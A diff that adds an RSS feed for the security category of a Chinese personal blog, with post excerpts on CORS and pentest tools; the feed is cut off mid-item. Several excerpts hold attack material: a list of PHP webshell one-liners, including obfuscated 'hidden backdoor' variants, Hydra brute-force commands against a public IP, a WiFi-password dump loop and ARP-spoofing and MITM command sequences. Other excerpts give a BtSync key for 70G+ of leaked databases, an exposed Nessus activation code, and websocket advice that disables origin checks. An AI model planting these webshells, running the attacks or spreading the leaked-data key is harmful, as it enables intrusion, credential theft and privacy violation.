@@ -1,0 +1,524 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>网络安全 on 时光小栈</title>
+    <link>/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</link>
+    <description>Recent content in 网络安全 on 时光小栈</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-Hans</language>
+    <managingEditor>rinetd@163.com (rinetd)</managingEditor>
+    <webMaster>rinetd@163.com (rinetd)</webMaster>
+    <copyright>Copyright (c) 2017. All rights reserved. (版权所有) &lt;a href=&#39;http://www.miitbeian.gov.cn/&#39;&gt;鲁ICP备17074587号-1&lt;/a&gt;</copyright>
+    <lastBuildDate>Mon, 23 Jul 2018 08:27:03 +0800</lastBuildDate>
+    
+	<atom:link href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/feed.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>跨域资源共享 CORS 详解</title>
+      <link>/frontend/cors/</link>
+      <pubDate>Mon, 23 Jul 2018 08:27:03 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/frontend/cors/</guid>
+      <description>&lt;h1 id=&#34;1-golang-websocket-跨域问题&#34;&gt;1. golang websocket 跨域问题&lt;/h1&gt;
+
+&lt;p&gt;首先, 因为跨域报错&lt;/p&gt;
+
+&lt;p&gt;服务器端日志&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;websocket: &#39;Origin&#39; header value not allowed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;前端报错:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;WebSocket connection to &#39;ws://localhost:8081/ws&#39; failed: Error during WebSocket handshake: Unexpected response code: 403
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;用的是 github.com/gorilla/websocket 这个 websocket 包&lt;/p&gt;
+
+&lt;p&gt;网上的方法有很多&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;比如 添加这个
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;w.Header().Set(&amp;quot;Access-Control-Allow-Origin&amp;quot;, &amp;quot;*&amp;quot;)
+w.Header().Set(&amp;quot;Access-Control-Allow-Methods&amp;quot;, &amp;quot;POST, GET, OPTIONS&amp;quot;)
+w.Header().Set(&amp;quot;Access-Control-Allow-Headers&amp;quot;, &amp;quot;*&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;比如 添加这个
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;origin := r.Header.Get(&amp;quot;Origin&amp;quot;)
+w.Header().Set(&amp;quot;Access-Control-Allow-Origin&amp;quot;, origin)
+w.Header().Set(&amp;quot;Access-Control-Allow-Credentials&amp;quot;, &amp;quot;true&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;比如 Nginx 中添加这个
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;proxy_http_version 1.1;
+proxy_set_header Upgrade $http_upgrade;
+proxy_set_header Connection &amp;quot;upgrade&amp;quot;;
+proxy_set_header Host $host;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;还有很多方法! 我试了都没用&lt;/p&gt;
+
+&lt;p&gt;然后我自己看了下代码, 发现在包里的 server.go 里 有个检测 host 的.. 大约在 127 行左右&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;checkOrigin := u.CheckOrigin
+if checkOrigin == nil {
+    checkOrigin = checkSameOrigin
+}
+if !checkOrigin(r) {
+    return u.returnError(w, r, http.StatusForbidden, &amp;quot;websocket:&#39;Origin&#39;header value not allowed&amp;quot;)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;而检验返回回来的是个 bool 值, 我打印了下我的结果.. 是 false&lt;/p&gt;
+
+&lt;p&gt;所以目前的方法是, 我把这个验证给去了...&lt;/p&gt;
+
+&lt;p&gt;做法是&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;r.Header.Del(&amp;quot;Origin&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;恩! 然后正常运行了... 只不过... 可能有点问题... 如果是公网.. 可以考虑加个白名单, 只有白名单里的 域名 才删除, 不是白名单里的, 就不允许...&lt;/p&gt;
+
+&lt;p&gt;origin := r.Header.Get(&amp;quot;Origin&amp;quot;)&lt;br /&gt;
+whiteList := &amp;quot;domain&amp;quot;// 哈哈刚学, 判断是否在数组里.. 暂时不会, 所以就写一个字符串... 类似于 php 的 in_array(PHP 是世界上最好的语言)&lt;br /&gt;
+if origin == whiteList {&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;r.Header.Del(&amp;quot;Origin&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;br /&gt;
+当然这个做法是不对的，正确的做法是:&lt;/p&gt;
+
+&lt;p&gt;upgrader.CheckOrigin = func(r *http.Request) bool {&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;return true
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;这个 CheckOrigin 是给开放给用户自己配置的。&lt;/p&gt;
+
+&lt;h1 id=&#34;2-配置-nginx-cors-跨域&#34;&gt;2.配置 nginx CORS 跨域&lt;/h1&gt;
+
+&lt;h2 id=&#34;设置允许所有的请求&#34;&gt;设置允许所有的请求&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;server {
+    location / {
+        add_header &#39;Access-Control-Allow-Origin&#39; &#39;*&#39;;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;只允许get请求&#34;&gt;只允许GET请求&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;server {
+    location / {
+        add_header &#39;Access-Control-Allow-Origin&#39; &#39;*&#39;;
+        add_header &#39;Access-Control-Request-Method&#39; &#39;GET&#39;;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;请求白名单&#34;&gt;请求白名单&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-nginx&#34;&gt;server {
+    location / {
+        # 白名单
+        if ($http_origin ~* (baidu\.com|github.xuexb.com)$) {
+            add_header &#39;Access-Control-Allow-Origin&#39; &#39;$http_origin&#39;;
+
+            # 允许cookie
+            add_header &#39;Access-Control-Allow-Credentials&#39; true;
+
+            # 只允许某些方法
+            add_header &#39;Access-Control-Request-Method&#39; &#39;GET, POST, OPTIONS&#39;;
+
+            # 支持获取其她字段, 需要前端设置 `xhr.withCredentials = true`
+            add_header &#39;Access-Control-Allow-Headers&#39; &#39;User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&#39;;
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;3-跨域资源共享-cors-详解&#34;&gt;3.跨域资源共享 CORS 详解&lt;/h1&gt;
+
+&lt;p&gt;CORS 是一个 W3C 标准，全称是 &amp;quot;跨域资源共享&amp;quot;（Cross-origin resource sharing）。&lt;br /&gt;
+它允许浏览器向跨源服务器，发出 &lt;code&gt;XMLHttpRequest&lt;/code&gt; 请求，从而克服了 AJAX 只能 ** 同源 ** 使用的限制。&lt;br /&gt;
+本文详细介绍 CORS 的内部机制。&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>渗透测试工具实战技巧合集</title>
+      <link>/hacker/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E5%90%88%E9%9B%86/</link>
+      <pubDate>Sat, 02 Jul 2016 15:09:22 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E5%90%88%E9%9B%86/</guid>
+      <description>渗透测试工具实战技巧合集 - FreeBuf.COM | 关注黑客与极客 最好的 NMAP 扫描策略 # 适用所有大小网络最好的 nmap 扫描策略 # 主机发现，生成存活主机列表 $ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24 $ grep</description>
+    </item>
+    
+    <item>
+      <title>ARPspoof</title>
+      <link>/hacker/02-spoof/arpspoof/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/arpspoof/</guid>
+      <description>[](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html) Usage: arpspoof [-i interface] [-t target] host -i interface 指定使用的网卡 -c own|host|both 攻击结束后如何恢复 -r 双向毒化 -t target 指定要攻击的目标 host 指定要拦截的主机(默认为网关) 启动Arpspoof注</description>
+    </item>
+    
+    <item>
+      <title>BTsync 资源</title>
+      <link>/hacker/btsync/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/btsync/</guid>
+      <description>最近几年网上泄露、流传出来的各种数据库，已收集有70G+ BtSync密钥：BHMIILA2HRJ5ZG6FN6KE7YUKBZMQOFCOA</description>
+    </item>
+    
+    <item>
+      <title>BurpsSuite</title>
+      <link>/hacker/burpsuite/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/burpsuite/</guid>
+      <description>Windows 下启动 BurpsSuite java.exe -cp BurpLoader.jar;burpsuite_pro_v1.7.03.jar larry.lau.BurpLoader java -jar BurpLoader.jar java -cp BurpLoader.jar;burpsuite_pro.jar larry.lau.BurpLoader java -cp BurpLoader.jar:burpsuite_pro.jar larry.lau.BurpLoader java -jar Cknife.jar PortSwigger CA Burp Suite使用介绍 book burpsuite实战指南 Burp Suite 官方文档中文版 java -jar BurpLoader.jar --help 插件安装目录 ~/.Burpsuite/bapps/ [Intercept</description>
+    </item>
+    
+    <item>
+      <title>Dsniff</title>
+      <link>/hacker/02-spoof/dsniff/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/dsniff/</guid>
+      <description>Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftn</description>
+    </item>
+    
+    <item>
+      <title>Etherwall</title>
+      <link>/hacker/02-spoof/etherwall/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/etherwall/</guid>
+      <description>Etherwall是一款免费且开源的网络安全工具，可以有效防御通过ARP Spoofing/Poisoning进行的中间人攻击(MITM)。同</description>
+    </item>
+    
+    <item>
+      <title>EwoMail修改密码后无法登陆bug修复</title>
+      <link>/post/basic/ewomail-bug%E4%BF%AE%E5%A4%8D/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/post/basic/ewomail-bug%E4%BF%AE%E5%A4%8D/</guid>
+      <description>EwoMail修改密码后无法登陆bug修复 现象: 新用户登陆后修改密码后 新密码旧密码都无法登陆 排查 ： 登陆数据库 查看密码 select id,password from ewomail.i_users \G; *************************** 11. row *************************** id: 12 password:</description>
+    </item>
+    
+    <item>
+      <title>Google Hack的一些整理</title>
+      <link>/hacker/google-hack/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/google-hack/</guid>
+      <description>Google Hack的一些整理 1.在githuh上查找 local.properties 文件 inurl:local filetype:properties site:github.com drone filetype:yml site:github.com 这里是一些关于Google Hack方面的整理 破解 序列号 Crack Keygen/Serial Google搜索技巧</description>
+    </item>
+    
+    <item>
+      <title>Hydra 破解登录密码</title>
+      <link>/hacker/hydra/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/hydra/</guid>
+      <description>hydra -L user.txt -P pass.txt -o savessh.log -f -vV -e ns 10.0.5.24 ssh hydra -L user.txt -P sup.txt -o savessh.log -f -vV -e ns 113.105.144.130 mysql hydra -M list.txt -l root -P dict1000.txt -t 64 -o ssh.txt ssh ###Hydra 破解登录密码### 格式： hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T</description>
+    </item>
+    
+    <item>
+      <title>Kali</title>
+      <link>/hacker/kali/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/kali/</guid>
+      <description>Kali $ wget -q -O - https://www.kali.org/archive-key.asc | gpg --import # or... $ gpg --keyserver hkp://keys.gnupg.net --recv-key 7D8D0BF6 # ...and verify that the displayed fingerprint matches the one below $ gpg --list-keys --with-fingerprint 7D8D0BF6 pub 4096R/7D8D0BF6 2012-03-05 [expires: 2018-02-02] Key fingerprint = 44C6 513A 8E4F B3D3 0875 F758 ED44 4FF0 7D8D 0BF6 uid Kali Linux Repository &amp;lt;devel@kali.org&amp;gt; sub 4096R/FC0D0DCB 2012-03-05 [expires: 2018-02-02] gpg --verify SHA1SUMS.gpg SHA1SUMS gpg: Signature made Thu</description>
+    </item>
+    
+    <item>
+      <title>Kali Linux信息收集之bing-ip2hosts</title>
+      <link>/hacker/01-info-gather/bing-ip2hosts/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/01-info-gather/bing-ip2hosts/</guid>
+      <description>0x00 bing-ip2hosts介绍 Bing.com是微软拥有的以前称为MSN搜索和实时搜索的搜索引擎。它具有搜索在特定IP地址上的网站的独特功</description>
+    </item>
+    
+    <item>
+      <title>Nessus</title>
+      <link>/hacker/nessus/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/nessus/</guid>
+      <description>注册 http://www.tenable.com/products/nessus-home Your activation code for the Nessus Home is E793-A801-D230-1175-7DCD 安装启动 systemctl start nessusd.service https://118.190.98.144:8834 rinetd sdl...</description>
+    </item>
+    
+    <item>
+      <title>Netstat 中 Recv-Q和Send-Q状态</title>
+      <link>/linux/linux-ip-netstat-%E4%B8%AD-recv-q%E5%92%8Csend-q%E7%8A%B6%E6%80%81/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/linux/linux-ip-netstat-%E4%B8%AD-recv-q%E5%92%8Csend-q%E7%8A%B6%E6%80%81/</guid>
+      <description>实时监控网络状态： watch -n 1 netstat -ant 执行命令查看当前网络状态时候发现,执行了命令 netstat -anp b1发现recv-q 和 send-q 状态不是很正常，对这2个参数不了解，特意</description>
+    </item>
+    
+    <item>
+      <title>SSRF的一些TIPS</title>
+      <link>/hacker/ssrf/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/ssrf/</guid>
+      <description>最近ssrf漏洞很火啊，这里贴一些tips 这些天专注了解了SSRF攻击（Server-side Request Forgery，服务器端请求伪造），对这类攻</description>
+    </item>
+    
+    <item>
+      <title>Shodan</title>
+      <link>/hacker/01-info-gather/shodan/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/01-info-gather/shodan/</guid>
+      <description>Shodan新手入坑指南 - FreeBuf.COM | 关注黑客与极客 使用搜索过滤 如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用</description>
+    </item>
+    
+    <item>
+      <title>Windows 命令行技巧</title>
+      <link>/hacker/windows-hacker/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/windows-hacker/</guid>
+      <description>cmd 一键获取 所有连接过的wifi 密码每次用wzcook for /f &amp;quot;skip=9 tokens=1,2 delims=:&amp;quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</description>
+    </item>
+    
+    <item>
+      <title>WireShark 过滤语法</title>
+      <link>/hacker/wirshark%E8%BF%87%E6%BB%A4%E8%AF%AD%E6%B3%95/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/wirshark%E8%BF%87%E6%BB%A4%E8%AF%AD%E6%B3%95/</guid>
+      <description>WireShark 过滤语法 原文地址：http://wenku.baidu.com/view/e8afe23143323968011c925f.html 1. 过滤</description>
+    </item>
+    
+    <item>
+      <title>driftnet</title>
+      <link>/hacker/02-spoof/%E5%9B%BE%E7%89%87%E5%97%85%E6%8E%A2-driftnet/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/%E5%9B%BE%E7%89%87%E5%97%85%E6%8E%A2-driftnet/</guid>
+      <description>语法： driftnet [options] [filter code] 主要参数： -b 捕获到新的图片时发出嘟嘟声 -i interface 选择监听接口 -f file 读取一个指定pcap数据包中的图片 -p 不让所监听的接口使用混杂模式 -a 后</description>
+    </item>
+    
+    <item>
+      <title>ettercap</title>
+      <link>/hacker/02-spoof/bettercap/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/bettercap/</guid>
+      <description>bettercap是一个强大的,模块化的,方便并且容易扩展的中间人攻击框架。 一些主要的功能如下: .支持全双工和半双工ARP欺骗。 .第一次真正</description>
+    </item>
+    
+    <item>
+      <title>ettercap</title>
+      <link>/hacker/02-spoof/ettercap/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/ettercap/</guid>
+      <description>Ettercap是一个多用途的开源工具，可以用来执行嗅探、主机分析等。在本教程中，我们使用中间人攻击进行ARP欺骗，ettercap有些不错</description>
+    </item>
+    
+    <item>
+      <title>etterfilter</title>
+      <link>/hacker/02-spoof/etterfilter/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/etterfilter/</guid>
+      <description>收集的一些Etterfilter Below is a filter that Zaps the encoding to force plain-text communication: if (ip.proto == TCP &amp;amp;&amp;amp; tcp.dst == 80) { if (search(DATA.data, “gzip”)) { replace(“gzip”, ” “); # note: four</description>
+    </item>
+    
+    <item>
+      <title>html实现网页跳转的几种方式</title>
+      <link>/frontend/html/html-url-location/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/frontend/html/html-url-location/</guid>
+      <description>纯 html 页面跳转 mkdir -p /docker/tomcat/webapps/ROOT/; echo &#39;&amp;lt;script language=&amp;quot;javascript&amp;quot;&amp;gt; window.location = &amp;quot;/work/&amp;quot;; &amp;lt;/script&amp;gt;&#39; &amp;gt; /docker/tomcat/webapps/ROOT/index.html javaScript 跳转 方法一: &amp;lt;script language=&amp;quot;javascript&amp;quot;&amp;gt;window.location = &amp;quot;http://www.baidu.com&amp;quot;;&amp;lt;/script&amp;gt; 方法二: &amp;lt;script language=&amp;quot;javascript&amp;quot;&amp;gt; document.location = &amp;quot;http://www.baidu.com&amp;quot;; &amp;lt;/script&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;正在跳转&amp;lt;/title&amp;g</description>
+    </item>
+    
+    <item>
+      <title>mitmproxy</title>
+      <link>/hacker/02-spoof/mitmproxy/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/mitmproxy/</guid>
+      <description>Shuttle是一个基于Go开发的全平台网络代理工具 sudo pip install mitmproxy 安装成功后会在生成两个工具/usr/local/bin/mitmproxy与/u</description>
+    </item>
+    
+    <item>
+      <title>nexpose</title>
+      <link>/hacker/nexpose/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/nexpose/</guid>
+      <description>注册码申请 https://www.rapid7.com/info/nexpose-community/</description>
+    </item>
+    
+    <item>
+      <title>pentest-cheatsheet</title>
+      <link>/hacker/pintest/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/pintest/</guid>
+      <description>pentest-cheatsheet From: https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/ Nmap Full Web Vulnerable Scan cd /usr/share/nmap/scripts/ wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;amp;&amp;amp; tar xzf nmap_nse_vulscan-2.0.tar.gz nmap -sS -sV --script=vulscan/vulscan.nse target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target nmap -PN -sS -sV --script=vulscan –script</description>
+    </item>
+    
+    <item>
+      <title>sslsplit</title>
+      <link>/hacker/02-spoof/sslsplit/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/sslsplit/</guid>
+      <description>http://www.roe.ch/SSLsplit [](http://www.freebuf.com/sectool/48016.html) [](http://blog.csdn.net/wizardforcel/article/details/52798019) 原文：http://blog.philippheckel.com/2013/08/04/use-sslsplit-to-transpa</description>
+    </item>
+    
+    <item>
+      <title>一句话</title>
+      <link>/hacker/shells/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/shells/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</guid>
+      <description>PHP &amp;lt;?php eval($_POST[$_GET[&amp;quot;id&amp;quot;]]);?&amp;gt; &amp;lt;?php eval($_POST[witkey]);?&amp;gt; pwd:[witkey] Encoder:[default] &amp;lt;?php assert($_POST[sb]);?&amp;gt; &amp;lt;?php $a = &amp;quot;a&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;s&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;t&amp;quot;; $a($_POST[cc]); ?&amp;gt; pwd:[cc] Encoder:[base64] &amp;lt;?php $ant=base64_decode(&amp;quot;YXNzZXJ0&amp;quot;); $ant($_POST[&#39;ant&#39;]); pwd:[ant] Encoder:[base64] 菜刀一句话 pwd:[h] Encoder:[base64] &amp;lt;?php $hh = &amp;quot;p&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;g&amp;quot;.&amp;quot;_&amp;quot;.&amp;quot;r&amp;quot;.&amp;quot;e&amp;quot;.&amp;quot;p&amp;quot;.&amp;quot;l&amp;quot;.&amp;quot;a&amp;quot;.&amp;quot;c&amp;quot;.&amp;quot;e&amp;quot;; $hh(&amp;quot;/[discuz]/e&amp;quot;,$_POST[&#39;h&#39;],&amp;quot;Access&amp;quot;); &amp;lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&amp;gt; ?2=assert pwd:[1] Encoder:[base64] &amp;lt;?php @$_GET[a]($_POST[1]);?&amp;gt; 超级隐蔽的PHP后门： ?a=assert&amp;amp;b=${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}; &amp;lt;?php $_GET[a]($_GET[b]);?&amp;gt; 利用方法： 重命名任何文件 &amp;lt;?php $reg=&amp;quot;c&amp;quot;.&amp;quot;o&amp;quot;.&amp;quot;p&amp;quot;.&amp;quot;y&amp;quot;; $reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]);</description>
+    </item>
+    
+    <item>
+      <title>史上最全Linux提权后获取敏感信息方法</title>
+      <link>/hacker/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8linux%E6%8F%90%E6%9D%83%E5%90%8E%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%96%B9%E6%B3%95-/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/%E5%8F%B2%E4%B8%8A%E6%9C%80%E5%85%A8linux%E6%8F%90%E6%9D%83%E5%90%8E%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%96%B9%E6%B3%95-/</guid>
+      <description>[](http://www.freebuf.com/articles/system/23993.html) Basic Linux Privilege Escalation 在本文开始之前，我想指出我不是专家。据我所知，在这个庞大的区域,没有一个“神奇”的答案.分享，共享（我的出发点）。下面是一个混合的</description>
+    </item>
+    
+    <item>
+      <title>嗅探基本原理</title>
+      <link>/hacker/02-spoof/%E5%97%85%E6%8E%A2%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/02-spoof/%E5%97%85%E6%8E%A2%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</guid>
+      <description>fragrouter -B1 dnsspoof -i ath0 (or whatever network interface you are using) webmitm -d ettercap -T -M arp:remote /router addy/ /victim addy/ ssldump -r your.cap -w webmitm.crt -d &amp;gt; out ######## echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward iptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT iptables -A FORWARD -j ACCEPT webmitm -d ettercap –G unified ath0 arp poision start sniffing ######### 原文</description>
+    </item>
+    
+    <item>
+      <title>实现微信浏览器内打开App Store链接</title>
+      <link>/post/basic/%E5%BE%AE%E4%BF%A1%E6%89%93%E5%BC%80%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/post/basic/%E5%BE%AE%E4%BF%A1%E6%89%93%E5%BC%80%E5%A4%96%E9%83%A8%E9%93%BE%E6%8E%A5/</guid>
+      <description>实现微信浏览器内打开App Store链接 作者: 海蓝 分类: 程序生活 发布时间: 2014-05-09 22:17 ė 被戳了 2,679 次 6 暂无评论 微信浏览器是不支持打开App Store 页面的，不</description>
+    </item>
+    
+    <item>
+      <title>指纹识别</title>
+      <link>/hacker/01-info-gather/cms-fingerprint/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hacker/01-info-gather/cms-fingerprint/</guid>
+      <description>[御剑web指纹识别] 网站指纹识别 whatweb apt-get install whatweb whatweb -v https://www.morningstarsecurity.com/ https://github.com/Dionach/CMSmap cmsmap.py -t https://example.com 手工检测Web应用指纹的一些技巧</description>
+    </item>
+    
+    <item>
+      <title>汽车CAN总线分析框架CANToolz</title>
+      <link>/hardware/cantoolz/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/hardware/cantoolz/</guid>
+      <description>汽车CAN总线分析框架CANToolz CANToolz 是一个分析控制局域网络CAN(Controller Area Network) 和设备的框架。该工具基于不同的模块组装在一起，</description>
+    </item>
+    
+    <item>
+      <title>破解百度云大文件下载</title>
+      <link>/post/basic/%E7%A0%B4%E8%A7%A3%E7%99%BE%E5%BA%A6%E4%BA%91/</link>
+      <pubDate>Tue, 29 Mar 2016 21:25:45 +0800</pubDate>
+      <author>rinetd@163.com (rinetd)</author>
+      <guid>/post/basic/%E7%A0%B4%E8%A7%A3%E7%99%BE%E5%BA%A6%E4%BA%91/</guid>
+      <description>以下两段代码任选一段加入收藏夹，需要下载时点一下即可。 javascript:navigator.__defineGetter__(&#39;platform&#39;,function(){return&#39;&#39;}) javascript:(Object.defineProperty(Object.getPrototypeOf(navigator),&#39;platform&#39;,{get:function(){return &#39;sb_baidu&#39;;}})) 如何修改游览器的navigator.platform属性 Object.defineProperty(navigator,&#39;platform&#39;,{get:function(){return &#39;Android&#39;;}});</description>
+    </item>
+    
+    <item>
+      <title>网络安全知识库</title>
